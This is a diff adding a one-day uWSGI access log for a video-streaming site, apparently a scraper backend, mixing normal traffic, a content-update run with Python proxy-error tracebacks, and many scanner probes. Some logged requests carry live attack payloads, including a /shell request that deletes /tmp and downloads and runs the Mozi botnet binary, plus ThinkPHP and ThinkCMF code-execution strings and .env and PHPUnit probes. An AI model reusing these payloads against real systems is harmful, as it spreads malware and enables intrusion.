@@ -1,0 +1,121 @@
+[1621699201] ./uwsgi.log reopened.
+[pid: 239511|app: 0|req: 551/1660] 91.205.173.252 () {48 vars in 881 bytes} [Sun May 23 00:08:32 2021] POST /boaform/admin/formLogin => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 552/1661] 165.227.136.172 () {30 vars in 335 bytes} [Sun May 23 01:25:33 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.0 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 553/1662] 116.233.190.56 () {30 vars in 342 bytes} [Sun May 23 01:30:01 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 657/1663] 116.233.190.56 () {30 vars in 342 bytes} [Sun May 23 01:30:02 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239512|app: 0|req: 224/1664] 116.233.190.56 () {30 vars in 342 bytes} [Sun May 23 01:30:02 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239513|app: 0|req: 232/1665] 116.233.190.56 () {30 vars in 372 bytes} [Sun May 23 01:30:02 2021] GET /navigation.html => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239513|app: 0|req: 233/1666] 116.233.190.56 () {30 vars in 342 bytes} [Sun May 23 01:30:02 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 554/1667] 116.233.190.56 () {42 vars in 801 bytes} [Sun May 23 01:30:02 2021] POST /cgi-bin/luci/;stok=/locale?form=lang => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239513|app: 0|req: 234/1668] 116.233.190.56 () {30 vars in 342 bytes} [Sun May 23 01:30:02 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 658/1669] 116.233.190.56 () {30 vars in 425 bytes} [Sun May 23 01:30:02 2021] GET /fx_plcinf.html?CMD=Monitor%20Start&LANG=EN => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239510|app: 0|req: 659/1670] 116.233.190.56 () {30 vars in 368 bytes} [Sun May 23 01:30:03 2021] GET /ifixwebspace/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 660/1671] 116.233.190.56 () {30 vars in 366 bytes} [Sun May 23 01:30:03 2021] GET /KingViewWeb/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239512|app: 0|req: 225/1672] 116.233.190.56 () {30 vars in 368 bytes} [Sun May 23 01:30:04 2021] GET /webconfig.ini => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239510|app: 0|req: 661/1673] 190.124.31.164 () {32 vars in 467 bytes} [Sun May 23 01:37:24 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 662/1674] 109.183.88.139 () {32 vars in 467 bytes} [Sun May 23 02:17:50 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 663/1675] 2.57.122.218 () {32 vars in 364 bytes} [Sun May 23 02:31:46 2021] GET /.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 555/1676] 2.57.122.218 () {36 vars in 469 bytes} [Sun May 23 02:31:47 2021] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 556/1677] 103.53.110.19 () {32 vars in 466 bytes} [Sun May 23 02:33:12 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 557/1678] 162.62.126.15 () {34 vars in 502 bytes} [Sun May 23 04:17:54 2021] GET /TP/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 664/1679] 162.62.126.15 () {34 vars in 488 bytes} [Sun May 23 04:17:55 2021] GET /TP/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239512|app: 0|req: 226/1680] 162.62.126.15 () {34 vars in 524 bytes} [Sun May 23 04:17:56 2021] GET /thinkphp/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239513|app: 0|req: 235/1681] 162.62.126.15 () {34 vars in 506 bytes} [Sun May 23 04:17:57 2021] GET /html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 558/1682] 162.62.126.15 () {34 vars in 496 bytes} [Sun May 23 04:17:58 2021] GET /public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 665/1683] 162.62.126.15 () {34 vars in 512 bytes} [Sun May 23 04:17:59 2021] GET /TP/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239510|app: 0|req: 666/1684] 162.62.126.15 () {34 vars in 484 bytes} [Sun May 23 04:18:00 2021] GET /elrekt.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239512|app: 0|req: 227/1685] 162.62.126.15 () {34 vars in 482 bytes} [Sun May 23 04:18:00 2021] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239513|app: 0|req: 236/1686] 162.62.126.15 () {34 vars in 467 bytes} [Sun May 23 04:18:01 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 667/1687] 162.221.192.26 () {34 vars in 490 bytes} [Sun May 23 05:00:40 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 668/1688] 45.83.67.107 () {42 vars in 577 bytes} [Sun May 23 05:27:21 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 669/1689] 76.94.20.233 () {28 vars in 308 bytes} [Sun May 23 06:48:32 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 559/1690] 110.44.116.149 () {32 vars in 466 bytes} [Sun May 23 07:00:18 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 560/1691] 118.126.124.172 () {38 vars in 594 bytes} [Sun May 23 07:36:43 2021] GET /phppma/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 561/1692] 85.121.193.204 () {28 vars in 310 bytes} [Sun May 23 07:43:11 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 562/1693] 118.126.124.7 () {38 vars in 593 bytes} [Sun May 23 09:19:24 2021] GET /MyAdmin/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 563/1694] 180.149.125.175 () {34 vars in 492 bytes} [Sun May 23 09:26:52 2021] GET /c/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 564/1695] 223.73.88.189 () {42 vars in 834 bytes} [Sun May 23 10:16:47 2021] GET /video/jx-play/ => generated 9900 bytes in 4 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 565/1696] 113.137.19.244 () {34 vars in 644 bytes} [Sun May 23 10:52:27 2021] GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 566/1697] 118.126.124.172 () {38 vars in 589 bytes} [Sun May 23 11:25:32 2021] GET /video/play/bajie225693/ => generated 15574 bytes in 7 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 567/1698] 118.126.124.198 () {38 vars in 561 bytes} [Sun May 23 11:39:33 2021] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 568/1699] 118.126.124.141 () {38 vars in 594 bytes} [Sun May 23 11:43:32 2021] GET /PMA2021/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 670/1700] 118.126.124.141 () {38 vars in 590 bytes} [Sun May 23 11:43:33 2021] GET /admin/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239511|app: 0|req: 569/1701] 45.146.164.125 () {38 vars in 612 bytes} [Sun May 23 12:34:55 2021] POST /api/jsonws/invoke => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 671/1702] 45.146.164.125 () {36 vars in 626 bytes} [Sun May 23 12:34:55 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239512|app: 0|req: 228/1703] 45.146.164.125 () {38 vars in 714 bytes} [Sun May 23 12:34:55 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239513|app: 0|req: 237/1704] 45.146.164.125 () {34 vars in 558 bytes} [Sun May 23 12:34:55 2021] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239513|app: 0|req: 238/1705] 45.146.164.125 () {36 vars in 655 bytes} [Sun May 23 12:34:56 2021] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239510|app: 0|req: 672/1706] 45.146.164.125 () {34 vars in 558 bytes} [Sun May 23 12:34:57 2021] GET /?XDEBUG_SESSION_START=phpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239510|app: 0|req: 673/1707] 45.146.164.125 () {34 vars in 722 bytes} [Sun May 23 12:34:57 2021] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 570/1708] 45.146.164.125 () {34 vars in 589 bytes} [Sun May 23 12:34:57 2021] GET /wp-content/plugins/wp-file-manager/readme.txt => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239513|app: 0|req: 239/1709] 45.146.164.125 () {36 vars in 604 bytes} [Sun May 23 12:34:57 2021] GET /_ignition/execute-solution => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239512|app: 0|req: 229/1710] 45.146.164.125 () {38 vars in 638 bytes} [Sun May 23 12:34:58 2021] POST /Autodiscover/Autodiscover.xml => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239512|app: 0|req: 230/1711] 45.146.164.125 () {34 vars in 515 bytes} [Sun May 23 12:34:59 2021] GET /console/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239510|app: 0|req: 674/1712] 118.126.124.172 () {38 vars in 604 bytes} [Sun May 23 12:41:44 2021] GET /phpMyadmin/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 675/1713] 118.126.124.7 () {38 vars in 598 bytes} [Sun May 23 12:47:49 2021] GET /db/dbweb/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 676/1714] 103.254.56.20 () {32 vars in 465 bytes} [Sun May 23 13:00:05 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 677/1715] 223.73.88.189 () {42 vars in 834 bytes} [Sun May 23 13:00:45 2021] GET /video/jx-play/ => generated 9900 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 571/1716] 223.73.88.189 () {44 vars in 995 bytes} [Sun May 23 13:00:51 2021] GET /video/search/?wd=%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB&page=1 => generated 31288 bytes in 79 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 678/1717] 223.73.88.189 () {42 vars in 846 bytes} [Sun May 23 13:01:06 2021] GET /view_log/2021-05-18/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239513|app: 0|req: 240/1718] 223.73.88.189 () {42 vars in 816 bytes} [Sun May 23 13:01:28 2021] GET /admin => generated 0 bytes in 0 msecs (HTTP/1.1 301) 5 headers in 175 bytes (1 switches on core 0)
+[pid: 239512|app: 0|req: 231/1719] 223.73.88.189 () {42 vars in 818 bytes} [Sun May 23 13:01:28 2021] GET /admin/ => generated 30384 bytes in 17 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
+[pid: 239510|app: 0|req: 679/1720] 223.73.88.189 () {44 vars in 880 bytes} [Sun May 23 13:01:33 2021] GET /admin/view_log/ => generated 18670 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
+--------2021-05-23 13:01:40 站点2开始更新--------
+[pid: 239510|app: 0|req: 680/1721] 223.73.88.189 () {44 vars in 884 bytes} [Sun May 23 13:01:45 2021] GET /admin/update_log/ => generated 19935 bytes in 41 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 239510|app: 0|req: 681/1722] 223.73.88.189 () {44 vars in 914 bytes} [Sun May 23 13:01:48 2021] GET /admin/update_log/?page=1211 => generated 20184 bytes in 24 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 682/1723] 223.73.88.189 () {44 vars in 924 bytes} [Sun May 23 13:02:18 2021] GET /admin/update_log/?page=1211 => generated 20184 bytes in 84 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 239510|app: 0|req: 683/1724] 223.73.88.189 () {44 vars in 880 bytes} [Sun May 23 13:02:31 2021] GET /admin/view_log/ => generated 18944 bytes in 13 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 684/1725] 223.73.88.189 () {44 vars in 902 bytes} [Sun May 23 13:02:36 2021] GET /admin/view_log/?page=1 => generated 18992 bytes in 10 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+获取到page: 100
+proxy:  Status Code： 502 重试
+get_json ERROR: list.remove(x): x not in list
+Traceback (most recent call last):
+  File "./video/func/getRequest.py", line 102, in get_json
+    PROXYLIST.remove(proxy)
+ValueError: list.remove(x): x not in list
+None
+[2021-05-23 13:02:42] [ERROR] page:92请求无数据，放入错误列表
+[pid: 239510|app: 0|req: 685/1726] 223.73.88.189 () {44 vars in 904 bytes} [Sun May 23 13:02:47 2021] GET /admin/get_carousel/ => generated 37555 bytes in 12 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 686/1727] 223.73.88.189 () {44 vars in 897 bytes} [Sun May 23 13:02:48 2021] GET /video/play/95617/ => generated 14682 bytes in 10 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
+proxy:  Status Code： 502 重试
+get_json ERROR: list.remove(x): x not in list
+Traceback (most recent call last):
+  File "./video/func/getRequest.py", line 102, in get_json
+    PROXYLIST.remove(proxy)
+ValueError: list.remove(x): x not in list
+None
+[2021-05-23 13:03:11] [ERROR] page:58请求无数据，放入错误列表
+page100保存成功
+proxy:  Status Code： 502 重试
+get_json ERROR: list.remove(x): x not in list
+Traceback (most recent call last):
+  File "./video/func/getRequest.py", line 102, in get_json
+    PROXYLIST.remove(proxy)
+ValueError: list.remove(x): x not in list
+None
+[2021-05-23 13:04:03] [ERROR] page:7请求无数据，放入错误列表
+已更新2940条数据
+出现错误页面： ['92', '58', '7']
+--------2021-05-23 13:05:55 站点2更新完成--------
+[pid: 239511|app: 0|req: 572/1728] 223.73.88.189 () {44 vars in 908 bytes} [Sun May 23 13:01:40 2021] GET /admin/update/?url_index=2&type=count => generated 83 bytes in 255812 msecs (HTTP/1.1 200) 6 headers in 179 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 687/1729] 192.241.210.231 () {34 vars in 397 bytes} [Sun May 23 13:08:17 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 688/1730] 118.126.124.172 () {38 vars in 620 bytes} [Sun May 23 13:26:15 2021] GET /administrator/admin/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 689/1731] 118.126.124.7 () {38 vars in 602 bytes} [Sun May 23 13:34:27 2021] GET /_phpmyadmin/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 690/1732] 223.71.167.163 () {34 vars in 461 bytes} [Sun May 23 13:40:07 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 691/1733] 178.93.16.173 () {32 vars in 465 bytes} [Sun May 23 14:54:37 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 692/1734] 118.126.124.141 () {38 vars in 601 bytes} [Sun May 23 15:19:39 2021] GET /video/play/101098/2-14.html => generated 17428 bytes in 7 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 573/1735] 193.118.53.194 () {34 vars in 490 bytes} [Sun May 23 15:41:50 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 574/1736] 162.142.125.40 () {28 vars in 313 bytes} [Sun May 23 15:51:41 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 693/1737] 162.142.125.40 () {34 vars in 445 bytes} [Sun May 23 15:51:42 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239511|app: 0|req: 575/1738] 118.126.124.7 () {38 vars in 605 bytes} [Sun May 23 16:01:07 2021] GET /php-myadmin/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 576/1739] 118.126.124.7 () {38 vars in 604 bytes} [Sun May 23 16:02:28 2021] GET /mysql/admin/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 577/1740] 184.105.247.194 () {28 vars in 311 bytes} [Sun May 23 18:20:01 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 578/1741] 112.96.197.103 () {42 vars in 849 bytes} [Sun May 23 19:58:49 2021] GET /admin/view_log/?page=1 => generated 20470 bytes in 6 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 579/1742] 118.126.124.74 () {38 vars in 592 bytes} [Sun May 23 20:54:42 2021] GET /video/play/89023/2-3.html => generated 17777 bytes in 7 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 580/1743] 186.47.152.230 () {32 vars in 473 bytes} [Sun May 23 20:58:30 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 581/1744] 110.53.83.20 () {34 vars in 472 bytes} [Sun May 23 21:07:30 2021] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239510|app: 0|req: 694/1745] 110.53.83.20 () {34 vars in 472 bytes} [Sun May 23 21:07:30 2021] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 239511|app: 0|req: 582/1746] 128.1.248.26 () {34 vars in 488 bytes} [Sun May 23 21:51:43 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 583/1747] 93.115.172.157 () {32 vars in 466 bytes} [Sun May 23 22:29:27 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[pid: 239511|app: 0|req: 584/1748] 128.14.209.242 () {34 vars in 485 bytes} [Sun May 23 22:38:12 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
+[1621785601] logsize: 20974, triggering log-reopen...
